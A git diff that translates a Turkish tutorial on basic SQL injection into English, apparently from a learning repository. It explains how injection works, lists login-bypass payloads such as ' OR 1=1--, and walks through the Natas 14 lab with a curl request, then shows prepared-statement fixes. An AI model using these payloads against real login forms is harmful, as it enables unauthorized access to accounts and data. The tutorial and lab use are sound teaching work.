@@ -1,171 +1,171 @@
-# 🌐 Web Güvenliği — SQL Injection (SQLi) — Temel
+# 🌐 Web Security — SQL Injection (SQLi) — Basics
 
-> Uygulama şunu yapıyor: kullanıcı adını al, SQL sorgusuna ekle, çalıştır.
-> Sen de SQL sorgusunun bir parçası olmayı reddedip kendi sorgunla konuşabilirsin.
+> The application does this: take the username, add it to the SQL query, run it.
+> You can refuse to be part of the SQL query and speak with your own query instead.
 
 ---
 
-## 📋 İçindekiler
+## 📋 Table of Contents
 
-- [SQL Nedir?](#sql-nedir)
-- [SQL Injection Nedir?](#sql-injection-nedir)
-- [Temel Payloadlar](#temel-payloadlar)
-- [Yorum Karakterleri](#yorum-karakterleri)
+- [What Is SQL?](#what-is-sql)
+- [What Is SQL Injection?](#what-is-sql-injection)
+- [Basic Payloads](#basic-payloads)
+- [Comment Characters](#comment-characters)
 - [Authentication Bypass](#authentication-bypass)
-- [Hata Mesajlarını Okumak](#hata-mesajlarını-okumak)
-- [Natas'ta Kullanım](#natasta-kullanım)
+- [Reading Error Messages](#reading-error-messages)
+- [Usage in Natas](#usage-in-natas)
 
 ---
 
-## SQL Nedir?
+## What Is SQL?
 
-**SQL (Structured Query Language)**, veritabanlarıyla konuşmak için kullanılan dildir. Web uygulamaları kullanıcı verilerini almak, doğrulamak ve kaydetmek için SQL sorguları çalıştırır.
+**SQL (Structured Query Language)** is the language used to talk to databases. Web applications run SQL queries to retrieve, validate, and save user data.
 
-### Temel SQL Sorguları
+### Basic SQL Queries
 
 ```sql
--- Tüm kullanıcıları getir
+-- Get all users
 SELECT * FROM users;
 
--- Belirli bir kullanıcıyı getir
+-- Get a specific user
 SELECT * FROM users WHERE username = 'admin';
 
--- Kullanıcı adı VE şifre eşleşmeli
+-- Username AND password must match
 SELECT * FROM users WHERE username = 'admin' AND password = '1234';
 
--- Tabloya kayıt ekle
-INSERT INTO users (username, password) VALUES ('yeni', 'sifre');
+-- Add a record to the table
+INSERT INTO users (username, password) VALUES ('new', 'password');
 ```
 
-### WHERE Koşulları
+### WHERE Conditions
 
 ```sql
-WHERE username = 'admin'         -- eşit
-WHERE id > 5                     -- büyük
-WHERE username LIKE '%admin%'    -- içeriyor
-WHERE username = 'a' OR 1=1     -- OR koşulu
-WHERE username = 'a' AND 1=2    -- AND koşulu
+WHERE username = 'admin'         -- equal
+WHERE id > 5                     -- greater than
+WHERE username LIKE '%admin%'    -- contains
+WHERE username = 'a' OR 1=1      -- OR condition
+WHERE username = 'a' AND 1=2     -- AND condition
 ```
 
 ---
 
-## SQL Injection Nedir?
+## What Is SQL Injection?
 
-Uygulama kullanıcı girdisini doğrulamadan SQL sorgusuna eklediğinde ortaya çıkar.
+It arises when the application adds user input to a SQL query without validating it.
 
 ```php
-// Tehlikeli kod:
+// Dangerous code:
 $user = $_POST['username'];
 $pass = $_POST['password'];
 $query = "SELECT * FROM users WHERE username='$user' AND password='$pass'";
 ```
 
-Kullanıcı `admin` ve `1234` girerse:
+If the user enters `admin` and `1234`:
 
 ```sql
 SELECT * FROM users WHERE username='admin' AND password='1234'
 ```
 
-Normal. Ama kullanıcı `admin'--` girerse:
+Normal. But if the user enters `admin'--`:
 
 ```sql
 SELECT * FROM users WHERE username='admin'--' AND password='...'
                                           ^^
-                                     yorum başladı, password koşulu devre dışı
+                                     comment started, password condition disabled
 ```
 
 ---
 
-## Temel Payloadlar
+## Basic Payloads
 
-### Tırnak Testi
+### The Quote Test
 
-Her zaman önce tek tırnak ile başla — hata mesajı gelirse SQLi var demektir.
+Always start with a single quote first — if an error message appears, it means there is SQLi.
 
 ```
-'                → Tek tırnak — syntax error bekliyoruz
-''               → Çift tek tırnak — kaçış
-"                → Çift tırnak
+'                → Single quote — we expect a syntax error
+''               → Double single quote — escape
+"                → Double quote
 ```
 
 ```sql
--- Girdi: '
+-- Input: '
 SELECT * FROM users WHERE username=''' AND password='...'
 --                                  ↑ syntax error!
 ```
 
-MySQL hata mesajı: `You have an error in your SQL syntax...`
+MySQL error message: `You have an error in your SQL syntax...`
 
-### Mantıksal Testler
+### Logical Tests
 
 ```
-' OR '1'='1     → Her zaman true
-' OR 1=1 --     → Her zaman true, geri kalanı yorum
-' OR 'a'='a     → Her zaman true
+' OR '1'='1     → Always true
+' OR 1=1 --     → Always true, the rest is a comment
+' OR 'a'='a     → Always true
 ```
 
 ---
 
-## Yorum Karakterleri
+## Comment Characters
 
-SQL'de yorumlar sorgunun geri kalanını devre dışı bırakır.
+In SQL, comments disable the rest of the query.
 
-| Veritabanı | Yorum Karakteri |
+| Database | Comment Character |
 |------------|-----------------|
-| MySQL | `--` (ve ardından boşluk: `-- `) veya `#` |
+| MySQL | `--` (followed by a space: `-- `) or `#` |
 | PostgreSQL | `--` |
-| MSSQL | `--` veya `/* */` |
+| MSSQL | `--` or `/* */` |
 | SQLite | `--` |
 | Oracle | `--` |
 
 ```sql
--- MySQL'de # yorum başlatır
+-- In MySQL, # starts a comment
 SELECT * FROM users WHERE username='admin'#' AND password='...'
 
--- -- yorum başlatır (sondaki boşluğa dikkat)
+-- -- starts a comment (watch the trailing space)
 SELECT * FROM users WHERE username='admin'-- ' AND password='...'
 ```
 
-> ⚠️ MySQL'de `--` yorumunun çalışması için arkasında **boşluk** olması gerekir. URL'de `--+` veya `-- -` kullanılır (+ = boşluk URL encoding'de).
+> ⚠️ In MySQL, for the `--` comment to work it needs a **space** after it. In a URL, `--+` or `-- -` is used (+ = space in URL encoding).
 
 ---
 
 ## Authentication Bypass
 
-Login formlarında kullanılan en yaygın SQL Injection tekniği.
+The most common SQL Injection technique used on login forms.
 
-### Senaryo
+### Scenario
 
 ```php
 $query = "SELECT * FROM users WHERE username='$user' AND password='$pass'";
-// Eğer sorgu sonuç dönerse → giriş başarılı
+// If the query returns a result → login successful
 ```
 
-### Bypass 1: Sadece username ile
+### Bypass 1: With Just the Username
 
 ```
 Username: admin'--
-Password: [boş veya herhangi bir şey]
+Password: [empty or anything]
 ```
 
 ```sql
 SELECT * FROM users WHERE username='admin'-- ' AND password='...'
--- password koşulu yok → admin'in şifresini bilmeden giriş
+-- no password condition → login without knowing admin's password
 ```
 
-### Bypass 2: OR ile her zaman true
+### Bypass 2: Always True with OR
 
 ```
 Username: ' OR 1=1-- 
-Password: [boş]
+Password: [empty]
 ```
 
 ```sql
 SELECT * FROM users WHERE username='' OR 1=1-- ' AND password='...'
--- 1=1 her zaman true → ilk kullanıcı (genellikle admin) döner
+-- 1=1 is always true → the first user (usually admin) is returned
 ```
 
-### Bypass 3: Her iki alanda
+### Bypass 3: In Both Fields
 
 ```
 Username: ' OR '1'='1
@@ -176,7 +176,7 @@ Password: ' OR '1'='1
 SELECT * FROM users WHERE username='' OR '1'='1' AND password='' OR '1'='1'
 ```
 
-### Bypass 4: Yorum olmadan (tırnakları kapatarak)
+### Bypass 4: Without a Comment (by closing the quotes)
 
 ```
 Username: admin
@@ -189,31 +189,31 @@ SELECT * FROM users WHERE username='admin' AND password='' OR '1'='1'
 
 ---
 
-## Hata Mesajlarını Okumak
+## Reading Error Messages
 
-MySQL hata mesajları çok bilgi verir:
+MySQL error messages give a lot of information:
 
 ```
 You have an error in your SQL syntax; check the manual that corresponds to 
 your MySQL server version for the right syntax to use near ''...' at line 1
 ```
 
-Bu mesaj → SQLi var, MySQL kullanıyor, tırnak sayısını ayarlamamız gerekiyor.
+This message → there is SQLi, it uses MySQL, we need to adjust the number of quotes.
 
 ```
 Warning: mysql_fetch_array() expects parameter 1 to be resource, 
 boolean given in /var/www/html/index.php on line 42
 ```
 
-Bu mesaj → Sorgu false döndürdü (boş sonuç veya hata).
+This message → the query returned false (empty result or error).
 
 ---
 
-## Natas'ta Kullanım
+## Usage in Natas
 
-### Natas 14 — Temel Authentication Bypass
+### Natas 14 — Basic Authentication Bypass
 
-**Kaynak kod:**
+**Source code:**
 
 ```php
 <?php
@@ -241,44 +241,44 @@ if(array_key_exists("username", $_REQUEST)) {
 ?>
 ```
 
-**Analiz:**
+**Analysis:**
 
-- Çift tırnak `"` kullanılıyor (`username=\"...\"`)
-- `debug` parametresi varsa sorguyu ekrana yazıyor — debug modu aktif et!
-- Sonuç 0'dan fazla satır dönerse → giriş başarılı
+- Double quotes `"` are used (`username=\"...\"`)
+- If the `debug` parameter is present, it prints the query to the screen — activate debug mode!
+- If the result returns more than 0 rows → login successful
 
-**Adım 1 — Debug modunu aktif et:**
+**Step 1 — Activate debug mode:**
 
 ```
 URL: http://natas14.natas.labs.overthewire.org/?debug
 ```
 
-Şimdi hangi sorgunun çalıştığını göreceksin.
+Now you'll see which query is run.
 
-**Adım 2 — Payload:**
+**Step 2 — Payload:**
 
 ```
 Username: " OR 1=1--
-Password: [boş]
+Password: [empty]
 ```
 
-Oluşan sorgu:
+The resulting query:
 
 ```sql
 SELECT * from users where username="" OR 1=1-- " and password=""
 ```
 
-`OR 1=1` her zaman true → en az bir satır döner → giriş başarılı.
+`OR 1=1` is always true → at least one row is returned → login successful.
 
-**curl ile:**
+**With curl:**
 
 ```bash
-curl -u natas14:[şifre] \
+curl -u natas14:[password] \
      'http://natas14.natas.labs.overthewire.org/?debug' \
      --data 'username=" OR 1=1--+&password='
 ```
 
-**Alternatif payloadlar:**
+**Alternative payloads:**
 
 ```
 Username: " OR "1"="1
@@ -288,45 +288,45 @@ Username: admin"--
 
 ---
 
-### SQL Injection — Kontrol Listesi
+### SQL Injection — Checklist
 
 ```
-Zafiyeti tespit et:
-  ☐ Tek tırnak ' gönder → SQL syntax hatası mı geldi?
-  ☐ Debug parametresi var mı? (?debug, ?show_query)
-  ☐ Hata mesajında "SQL", "mysql", "syntax" geçiyor mu?
+Detect the vulnerability:
+  ☐ Send a single quote ' → did a SQL syntax error appear?
+  ☐ Is there a debug parameter? (?debug, ?show_query)
+  ☐ Does the error message contain "SQL", "mysql", "syntax"?
 
-Bypass dene:
-  ☐ ' OR 1=1--     (tek tırnak + yorum)
-  ☐ " OR 1=1--     (çift tırnak + yorum)
-  ☐ ' OR 1=1#      (MySQL # yorum)
-  ☐ ' OR '1'='1    (tırnakları kapat)
-  ☐ admin'--        (belirli kullanıcı, password bypass)
+Try a bypass:
+  ☐ ' OR 1=1--     (single quote + comment)
+  ☐ " OR 1=1--     (double quote + comment)
+  ☐ ' OR 1=1#      (MySQL # comment)
+  ☐ ' OR '1'='1    (close the quotes)
+  ☐ admin'--        (specific user, password bypass)
 
-Tırnak türünü belirle:
-  ☐ Hata mesajına bak — '' mi " " mi?
-  ☐ Kaynak kodu varsa SQL sorgusunu bul
+Determine the quote type:
+  ☐ Look at the error message — is it '' or " "?
+  ☐ If there's source code, find the SQL query
 ```
 
 ---
 
-### Güvenli Kod — Prepared Statements
+### Secure Code — Prepared Statements
 
 ```php
-// KÖTÜ — string concatenation
+// BAD — string concatenation
 $query = "SELECT * FROM users WHERE username='$user' AND password='$pass'";
 
-// İYİ — prepared statement (parametreli sorgu)
+// GOOD — prepared statement (parameterized query)
 $stmt = $pdo->prepare("SELECT * FROM users WHERE username=? AND password=?");
 $stmt->execute([$user, $pass]);
 $result = $stmt->fetchAll();
 ```
 
-Prepared statement'ta kullanıcı girdisi **asla** SQL kodu olarak yorumlanmaz. `'` veya `"` gibi karakterler otomatik escape edilir.
+In a prepared statement, user input is **never** interpreted as SQL code. Characters like `'` or `"` are automatically escaped.
 
 ---
 
-## 🔗 Kaynaklar
+## 🔗 Resources
 
 - [PortSwigger — SQL Injection](https://portswigger.net/web-security/sql-injection)
 - [PortSwigger — SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
@@ -335,7 +335,7 @@ Prepared statement'ta kullanıcı girdisi **asla** SQL kodu olarak yorumlanmaz. 
 
 ---
 
-**Önceki konu:** [10_dosya_yukleme_bypass.md](./10_dosya_yukleme_bypass.md)
-**Sonraki konu:** [12_blind_sql_injection.md](./12_blind_sql_injection.md)
+**Previous topic:** [10_file_upload_bypass.md](./10_file_upload_bypass.md)
+**Next topic:** [12_blind_sql_injection.md](./12_blind_sql_injection.md)
 
-*Bu rehber [waitaseC137/linux_learning](https://github.com/waitaseC137/linux_learning) reposunun bir parçasıdır.*
+*This guide is part of the [waitaseC137/linux_learning](https://github.com/waitaseC137/linux_learning) repository.*
